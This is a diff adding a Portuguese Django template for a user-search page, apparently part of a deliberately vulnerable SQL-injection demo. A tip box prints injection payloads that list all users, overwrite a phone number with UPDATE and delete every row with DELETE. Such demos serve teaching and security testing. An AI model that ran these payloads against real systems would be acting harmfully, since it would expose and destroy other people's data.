@@ -1,0 +1,48 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>Consultar usuários</title>
+  </head>
+  <style>
+  .tip {
+    width: auto;
+    padding: 10px;
+    background-color: #ccc;
+  }
+  </style>
+  <body>
+    <div class="tip">
+      <p>Para listar todos os usuários: <code>admin' OR '1'='1</code></p>
+
+      <h3>Os comandos abaixo não funcionam devido ao comportamento do execute, porém podemos testar com executescript</h3>
+      <p>Para manipular dados (com UPDATE): <code>admin'; UPDATE users_user SET phone='000000' WHERE name='admin' --</code></p>
+      <p>Para excluir dados (com DELETE): <code>admin'; DELETE FROM users_user WHERE '1'='1' --</code></p>
+    </div>
+    <h1>Consultar usuários</h1>
+    <!-- Formulário para buscar usuários pelo nome -->
+    <form method="post" action="{% url 'users:search_users' %}">
+        {% csrf_token %}
+        <label for="username">Nome de usuário:</label>
+        <input type="text" id="username" name="username">
+        <button type="submit">Buscar</button>
+    </form>
+
+    <!-- Lista de usuários, se houver -->
+    {% if users %}
+    <ul>
+      {% for user in users %}
+          <li>
+            Nome: {{ user.1 }} <br>
+            Telefone: {{ user.2 }} <br>
+            E-mail: {{ user.3 }} <br>
+          </li>
+          <hr>
+      {% endfor %}
+    </ul>
+    {% else %}
+    <p>...</p>
+    {% endif %}
+  </body>
+</html>
